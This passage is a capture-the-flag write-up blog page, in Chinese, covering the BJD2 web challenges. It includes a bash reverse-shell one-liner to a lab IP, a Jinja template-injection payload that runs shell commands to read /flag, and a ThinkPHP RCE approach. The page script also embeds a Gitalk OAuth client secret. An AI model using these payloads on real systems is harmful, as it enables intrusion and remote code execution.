@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head><meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+
+
+
+<link rel="stylesheet" href="/css/main.min.603bdac5a514a018c8a598608c9559e9356dee22c6203eb4ba7ad06c438010c7.css" integrity="sha256-YDvaxaUUoBjIpZhgjJVZ6TVt7iLGID60unrQbEOAEMc="/>
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code&family=Lora&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/code-line"></script><title>BJD2-Web 部分 Write up</title>
+</head>
+<body class="flex flex-col bg-gray-100">
+
+<div class="flex my-8 font-serif">
+    <div class="flex-auto w-1/3">
+        <div class="w-64 h-full mr-2 ml-auto">
+            <div class="mb-8"><div class="border rounded-lg shadow-md">
+    <div class="h-32 flex rounded-t-lg text-white" style="background-image: url('/images/background-1.jpg')">
+        <div class="m-auto">
+            <div class="text-center font-serif text-3xl my-2"><a href="/">Noth</a></div>
+            <div class="text-center font-serif">去码头整点薯条</div>
+        </div>
+    </div>
+    <nav class="rounded-b-lg bg-white">
+        <ul class="py-2 ml-8">
+            <li class="my-2 content-center">
+                <a href="/" class="hover:text-red-300"><i class="fas fa-home"></i>&nbsp;&nbsp;&nbsp;主页</a>
+            </li>
+
+
+
+            <li class="my-2 content-center">
+                <a href="/metapages/archive/" class="hover:text-red-300"><i class="fas fa-scroll"></i>&nbsp;&nbsp;归档</a>
+            </li>
+            <li class="my-2 content-center">
+                <a href="/categories/" class="hover:text-red-300"><i class="fas fa-th"></i>&nbsp;&nbsp;&nbsp;分类</a>
+            </li>
+            <li class="my-2 content-center">
+                <a href="/tags/" class="hover:text-red-300"><i class="fas fa-tags"></i>&nbsp;&nbsp;标签</a>
+            </li>
+            <li class="my-2 content-center">
+                <a href="/metapages/link/" class="hover:text-red-300"><i class="fas fa-link"></i>&nbsp;&nbsp;&nbsp;链接</a>
+            </li>
+            <li class="my-2 content-center">
+                <a href="/metapages/message/" class="hover:text-red-300"><i class="fas fa-comment-alt"></i>&nbsp;&nbsp;&nbsp;留言</a>
+            </li>
+        </ul>
+    </nav>
+</div></div>
+            <div class="sticky top-2">
+                <div class="toc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#schrodinger">Schrödinger</a></li>
+    <li><a href="#duangshell">duangShell</a></li>
+    <li><a href="#old-hack">old-hack</a></li>
+    <li><a href="#elementmaster">elementmaster</a></li>
+    <li><a href="#fake-google">fake-google</a></li>
+  </ul>
+</nav>
+</div>
+            </div>
+        </div>
+    </div>
+    <div class="flex-auto w-2/3">
+        <div class="w-200 border rounded-lg bg-white ml-2 mr-auto px-4">
+            <h1 class="font-serif text-4xl text-center mt-8 mb-2">BJD2-Web 部分 Write up</h1>
+            <div class="text-right text-gray-500 mr-20">
+                <span>
+                    Mar. 23, 2020 |
+                    <i class="far fa-bookmark"></i> 
+                </span>
+            </div>
+            <div class="content px-6 mb-8">
+                <p>BJD2 部分Web题Writeup</p>
+<h2 id="schrodinger">Schrödinger</h2>
+<p><img src="https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/bjd2/Schr.png" alt="Schr">
+查看源码或者直接在页面上能看到一个 test.php, 访问之后只是一个登陆界面，提示在密码中留了一些很棒的东西。尝试登陆失败，也没有SQL注入什么的，先返回上个页面看看。
+这里也有一个输入框，看看上面给的文字，大概意思是在下面输入网址会对其进行爆破，但是在验证之前并不知道是否已经得到密码，并且运行时间越长，得到密码概率越大，先输入一个test.php试试：
+<img src="https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/bjd2/Schr2.png" alt="Schr2">
+可以看到一开始还是很快的，但是到后来会越来越慢，而且在检查几次都是失败之后，猜想是否能直接将数值变大呢？检查源码发现了一个假的jQuery.js，可以看出其是控制页面数字的，但是在将其更改后，即使这个值超过 100% 也仍然返回没有爆破。好吧，看来是不能直接这样获取了，是用BP截一下包试试：
+<img src="https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/bjd2/Schr3.png" alt="Schr3">
+Cookie字段有个值得注意的东西，尤其是<code>%3D</code>是<code>=</code>的url编码，试一下Base64解码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">&gt;&gt;&gt;</span> base64<span style="color:#f92672">.</span>b64decode(<span style="color:#e6db74">&#39;MTU4NDk3MDEyOA==&#39;</span>)
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1584970128&#39;</span>
+</code></pre></div><p>前面的属性dXNlcg一开始没解出来，后来才意识到，发现其实是BASE64编码的user，只是把多余的等号给去掉了。
+也就是说user是一串数字，那是不是说只有特殊用户才能返回密码呢？一开始我试了一下原来页面给的 imagin@1580308166 带入，以为是管理员，但是仍然没什么作用，
+这时可以注意，他的已经运行时间可预计成功率并非是从0开始的，也就是说并不会被刷新；虽然不可能直接等到他跑慢，但是这是不是有一个用户是跑满的呢，这是就考虑到使用 0000000000这个user，因为越早使用运行时间应该也越久：
+<img src="https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/bjd2/Schr4.png" alt="Schr4">
+果然时间已经很大了（而且看来user的值其实是运行的时间值，所以多解码几次也会想到伪造一个最小的数字）：
+<img src="https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/bjd2/Schr5.png" alt="Schr5">
+可以看到密码是一个bilibili的av号和一个数字，回到test页面输入密码，结果是错误？！各种格式试试都还是错误，甚至尝试直接作为flag提交都不行。最后根据给出的hint才知道这个av号是真的有用，因为flag是在评论区。（其实之前也到过评论区，但是只看了眼最新的一页和第一页评论的评论，甚至扫了眼弹幕，但是没有看到flag，于是以为题目提示密码有一些特别的东西只是说这是个av号，但是没想到师傅发的flag刚好被最新的评论刷到第二页了，可惜了，说不定还能多混一个一血）。</p>
+<h2 id="duangshell">duangShell</h2>
+<p>提示swp，那么直接下载<code>.index.php.swp</code>，使用<code>vi -r .index.php.swp</code>恢复可以看到源码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;how can i give you source code? .swp?!&#34;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span>;
+<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;girl_friend&#39;</span>])) {
+    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;where is P3rh4ps&#39;s girl friend ???&#34;</span>);
+} <span style="color:#66d9ef">else</span> {
+    $girl <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;girl_friend&#39;</span>];
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/\&gt;|\\\/&#39;</span>, $girl)) {
+        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;just girl&#39;</span>);
+    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#39;</span>, $girl)) {
+        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;img src=&#39;img/p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&#34;</span>;
+    } <span style="color:#66d9ef">else</span> {
+        <span style="color:#75715e">//duangShell~~~~
+</span><span style="color:#75715e"></span>        <span style="color:#a6e22e">exec</span>($girl);
+    }
+}
+</code></pre></div><p>可以看到exec执行语句，这里我以为是执行，没想到竟然是弹shell（虽然提示的很明显了），还是太菜了。
+这里在BUU有复现，使用另一个浏览器开一个新账号，然后打开Basic的Linux Labs，将弹shell的指令保存在文件里，然后通过访问这个文件并用bash执行来弹shell：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@3e8a72931b68:/var/www/html# vi shell.txt
+bash -i &gt;&amp; /dev/tcp/174.1.90.116/8080 0&gt;&amp;<span style="color:#ae81ff">1</span>
+root@3e8a72931b68:/var/www/html# nc -lvp <span style="color:#ae81ff">8080</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8080</span> ...
+</code></pre></div><p>回到那个网页执行命令，由于是POST方法，因此使用HACKBAR来操作：
+<img src="https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/bjd2/duangShell.png" alt="duangShell">
+服务器端接收到指令：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@3e8a72931b68:/var/www/html# nc -lvp <span style="color:#ae81ff">8080</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8080</span> ...
+connect to <span style="color:#f92672">[</span>174.1.90.116<span style="color:#f92672">]</span> from 1767-1bf2025e-9c3c-4c0c-8860-d0342138d00c.1.iqfuoov4ug7r7577a021r58kw.ctfd_swarm <span style="color:#f92672">[</span>174.1.90.113<span style="color:#f92672">]</span> <span style="color:#ae81ff">41726</span>
+bash: cannot set terminal process group <span style="color:#f92672">(</span>167<span style="color:#f92672">)</span>: Not a tty
+bash: no job control in this shell
+bash-4.4$
+</code></pre></div><p>接下来就可以找flag，主目录下有一个flag，但是打开发现是假flag，那就使用<code>find / -name flag</code>找一下吧：
+<img src="https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/bjd2/duangShell.png" alt="duangShell2"></p>
+<h2 id="old-hack">old-hack</h2>
+<p>上来就是一个黑页：
+<img src="https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/bjd2/hack1.png" alt="hack1">
+值得注意的就是使用了ThinkPHP5，那么就查一下thinkphp5有没有什么可以利用的漏洞：
+<img src="https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/bjd2/hack2.png" alt="hack2">
+可以看出thinkphp5是由两个RCE漏洞的。尝试直接使用第一个payload之后会出现一个报错页面，可以发现thinkphp版本为5.0.23，那么就不能使用第一个了，所以使用下面的payload：
+<img src="https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/bjd2/hack3.png" alt="hack3">
+这次直接套用payload就可以执行命令了，然后找到flag就行了。</p>
+<h2 id="elementmaster">elementmaster</h2>
+<p>脑洞题，没做出来，完全不知道怎么做。看到Element还以为之页面的标签什么的，没想到真就是元素。
+打开页面是Y1ng师傅花了一个小时画出来的图，查看源代码，可以看到两个id，将其转换为字符串之后分别为：Po.和php，于是尝试访问Po.php，但是只有一个点。
+根据Hint，门捷列夫和108个元素，而且Po也是一个元素，猜想应该是个元素周期表有关，于是访问所有元素组成的页面：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
+<span style="color:#f92672">import</span> requests <span style="color:#66d9ef">as</span> req
+elements <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;H&#39;</span>, <span style="color:#e6db74">&#39;He&#39;</span>, <span style="color:#e6db74">&#39;Li&#39;</span>, <span style="color:#e6db74">&#39;Be&#39;</span>, <span style="color:#e6db74">&#39;B&#39;</span>, <span style="color:#e6db74">&#39;C&#39;</span>, <span style="color:#e6db74">&#39;N&#39;</span>, <span style="color:#e6db74">&#39;O&#39;</span>, <span style="color:#e6db74">&#39;F&#39;</span>, <span style="color:#e6db74">&#39;Ne&#39;</span>, <span style="color:#e6db74">&#39;Na&#39;</span>, <span style="color:#e6db74">&#39;Mg&#39;</span>, <span style="color:#e6db74">&#39;Al&#39;</span>, <span style="color:#e6db74">&#39;Si&#39;</span>, <span style="color:#e6db74">&#39;P&#39;</span>, <span style="color:#e6db74">&#39;S&#39;</span>, <span style="color:#e6db74">&#39;Cl&#39;</span>, <span style="color:#e6db74">&#39;Ar&#39;</span>,
+            <span style="color:#e6db74">&#39;K&#39;</span>, <span style="color:#e6db74">&#39;Ca&#39;</span>, <span style="color:#e6db74">&#39;Sc&#39;</span>, <span style="color:#e6db74">&#39;Ti&#39;</span>, <span style="color:#e6db74">&#39;V&#39;</span>, <span style="color:#e6db74">&#39;Cr&#39;</span>, <span style="color:#e6db74">&#39;Mn&#39;</span>, <span style="color:#e6db74">&#39;Fe&#39;</span>, <span style="color:#e6db74">&#39;Co&#39;</span>, <span style="color:#e6db74">&#39;Ni&#39;</span>, <span style="color:#e6db74">&#39;Cu&#39;</span>, <span style="color:#e6db74">&#39;Zn&#39;</span>, <span style="color:#e6db74">&#39;Ga&#39;</span>, <span style="color:#e6db74">&#39;Ge&#39;</span>, <span style="color:#e6db74">&#39;As&#39;</span>, <span style="color:#e6db74">&#39;Se&#39;</span>, <span style="color:#e6db74">&#39;Br&#39;</span>, 
+            <span style="color:#e6db74">&#39;Kr&#39;</span>, <span style="color:#e6db74">&#39;Rb&#39;</span>, <span style="color:#e6db74">&#39;Sr&#39;</span>, <span style="color:#e6db74">&#39;Y&#39;</span>, <span style="color:#e6db74">&#39;Zr&#39;</span>, <span style="color:#e6db74">&#39;Nb&#39;</span>, <span style="color:#e6db74">&#39;Mo&#39;</span>, <span style="color:#e6db74">&#39;Te&#39;</span>, <span style="color:#e6db74">&#39;Ru&#39;</span>, <span style="color:#e6db74">&#39;Rh&#39;</span>, <span style="color:#e6db74">&#39;Pd&#39;</span>, <span style="color:#e6db74">&#39;Ag&#39;</span>, <span style="color:#e6db74">&#39;Cd&#39;</span>, <span style="color:#e6db74">&#39;In&#39;</span>, <span style="color:#e6db74">&#39;Sn&#39;</span>, <span style="color:#e6db74">&#39;Sb&#39;</span>, <span style="color:#e6db74">&#39;Te&#39;</span>, 
+            <span style="color:#e6db74">&#39;I&#39;</span>, <span style="color:#e6db74">&#39;Xe&#39;</span>, <span style="color:#e6db74">&#39;Cs&#39;</span>, <span style="color:#e6db74">&#39;Ba&#39;</span>, <span style="color:#e6db74">&#39;La&#39;</span>, <span style="color:#e6db74">&#39;Ce&#39;</span>, <span style="color:#e6db74">&#39;Pr&#39;</span>, <span style="color:#e6db74">&#39;Nd&#39;</span>, <span style="color:#e6db74">&#39;Pm&#39;</span>, <span style="color:#e6db74">&#39;Sm&#39;</span>, <span style="color:#e6db74">&#39;Eu&#39;</span>, <span style="color:#e6db74">&#39;Gd&#39;</span>, <span style="color:#e6db74">&#39;Tb&#39;</span>, <span style="color:#e6db74">&#39;Dy&#39;</span>, <span style="color:#e6db74">&#39;Ho&#39;</span>, <span style="color:#e6db74">&#39;Er&#39;</span>, <span style="color:#e6db74">&#39;Tm&#39;</span>, 
+            <span style="color:#e6db74">&#39;Yb&#39;</span>, <span style="color:#e6db74">&#39;Lu&#39;</span>, <span style="color:#e6db74">&#39;Hf&#39;</span>, <span style="color:#e6db74">&#39;Ta&#39;</span>, <span style="color:#e6db74">&#39;W&#39;</span>, <span style="color:#e6db74">&#39;Re&#39;</span>, <span style="color:#e6db74">&#39;Os&#39;</span>, <span style="color:#e6db74">&#39;Ir&#39;</span>, <span style="color:#e6db74">&#39;Pt&#39;</span>, <span style="color:#e6db74">&#39;Au&#39;</span>, <span style="color:#e6db74">&#39;Hg&#39;</span>, <span style="color:#e6db74">&#39;Tl&#39;</span>, <span style="color:#e6db74">&#39;Pb&#39;</span>, <span style="color:#e6db74">&#39;Bi&#39;</span>, <span style="color:#e6db74">&#39;Po&#39;</span>, <span style="color:#e6db74">&#39;At&#39;</span>, <span style="color:#e6db74">&#39;Rn&#39;</span>, 
+            <span style="color:#e6db74">&#39;Fr&#39;</span>, <span style="color:#e6db74">&#39;Ra&#39;</span>, <span style="color:#e6db74">&#39;Ac&#39;</span>, <span style="color:#e6db74">&#39;Th&#39;</span>, <span style="color:#e6db74">&#39;Pa&#39;</span>, <span style="color:#e6db74">&#39;U&#39;</span>, <span style="color:#e6db74">&#39;Np&#39;</span>, <span style="color:#e6db74">&#39;Pu&#39;</span>, <span style="color:#e6db74">&#39;Am&#39;</span>, <span style="color:#e6db74">&#39;Cm&#39;</span>, <span style="color:#e6db74">&#39;Bk&#39;</span>, <span style="color:#e6db74">&#39;Cf&#39;</span>, <span style="color:#e6db74">&#39;Es&#39;</span>, <span style="color:#e6db74">&#39;Fm&#39;</span>,<span style="color:#e6db74">&#39;Md&#39;</span>, <span style="color:#e6db74">&#39;No&#39;</span>, <span style="color:#e6db74">&#39;Lr&#39;</span>,
+            <span style="color:#e6db74">&#39;Rf&#39;</span>, <span style="color:#e6db74">&#39;Db&#39;</span>, <span style="color:#e6db74">&#39;Sg&#39;</span>, <span style="color:#e6db74">&#39;Bh&#39;</span>, <span style="color:#e6db74">&#39;Hs&#39;</span>, <span style="color:#e6db74">&#39;Mt&#39;</span>, <span style="color:#e6db74">&#39;Ds&#39;</span>, <span style="color:#e6db74">&#39;Rg&#39;</span>, <span style="color:#e6db74">&#39;Cn&#39;</span>, <span style="color:#e6db74">&#39;Nh&#39;</span>, <span style="color:#e6db74">&#39;Fl&#39;</span>, <span style="color:#e6db74">&#39;Mc&#39;</span>, <span style="color:#e6db74">&#39;Lv&#39;</span>, <span style="color:#e6db74">&#39;Ts&#39;</span>, <span style="color:#e6db74">&#39;Og&#39;</span>, <span style="color:#e6db74">&#39;Uue&#39;</span>)
+<span style="color:#66d9ef">for</span> symbol <span style="color:#f92672">in</span> elements:
+    link <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://2637c87f-c19e-427c-b3bf-648619face35.node3.buuoj.cn/&#34;</span> <span style="color:#f92672">+</span> symbol <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.php&#34;</span>
+    response <span style="color:#f92672">=</span> req<span style="color:#f92672">.</span>get(link)
+    <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+        print(response<span style="color:#f92672">.</span>text, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">continue</span>
+
+<span style="color:#75715e"># 运行结果如下：</span>
+PS T:\Repo\Python__\TempScript<span style="color:#f92672">&gt;</span> python <span style="color:#f92672">.</span>\Element<span style="color:#f92672">.</span>py
+And_th3_3LemEnt5_w1LL_De5tR0y_y0u<span style="color:#f92672">.</span>php
+</code></pre></div><p>访问这个页面就能得到flag。</p>
+<h2 id="fake-google">fake-google</h2>
+<p>打开之后事业个虚假的Google页面，输入东西查询之后会简单的将内容显示出来，这时候考虑会不会是模板注入？于是输入\{\{3*3}}，发现页面返回了9，也就是可以执行，很有可能是模板注入。
+尝试<code>qaq?name=\{\{config}}</code>返回了相关信息：
+<img src="https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/bjd2/fake.png" alt="fake">
+接下来就是套路了，找到payload如下<code>qaq?name=\{\{config.__class__.__init__.__globals__[%27os%27].popen('cmd').read()}}</code>，就可以找flag了：</p>
+<pre tabindex="0"><code>qaq?name={{config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20/%27).read()}}
+P3's girlfirend is : app bd_build bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
+qaq?name={{config.__class__.__init__.__globals__[%27os%27].popen('cat /flag').read()}}
+P3's girlfirend is : flag{7ab1f16c-fa8f-4be9-8958-55a0f878ba57}
+</code></pre><!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+
+            </div>
+        </div>
+        <div class="w-200">
+            <div id="gitalk"></div>
+<script>
+    var gitalk = new Gitalk({
+        clientID: '9a04c6b451fbce76511d',
+        clientSecret: '430c540c77ecd6b59749c60f0341c057bd5320a0',
+        repo: 'Causa1ity.github.io',
+        owner: 'Causa1ity',
+        admin: 'Causa1ity',
+        id: 'https:\/\/causality.top\/security\/writeups\/bjd2\/',
+        distractionFreeMode: false
+    })
+
+    gitalk.render('gitalk')
+</script>
+        </div>
+    </div>
+</div>
+<script>
+    CodeLine.initOnPageLoad({
+        copyBtn: {show: true, position: 'top'},
+        toggleBtn: {show: false}
+    })
+</script>
+<div class="text-center my-8">
+    <span class="font-serif text-lg">
+        Powered By <a href="https://gohugo.io/" class="font-bold hover:text-blue-400">Hugo</a>
+        with theme <a href="https://github.com/causa1ity/hugo-theme-noth/" class="font-bold hover:text-blue-400">Noth</a>
+    </span>
+</div></body>
+</html>
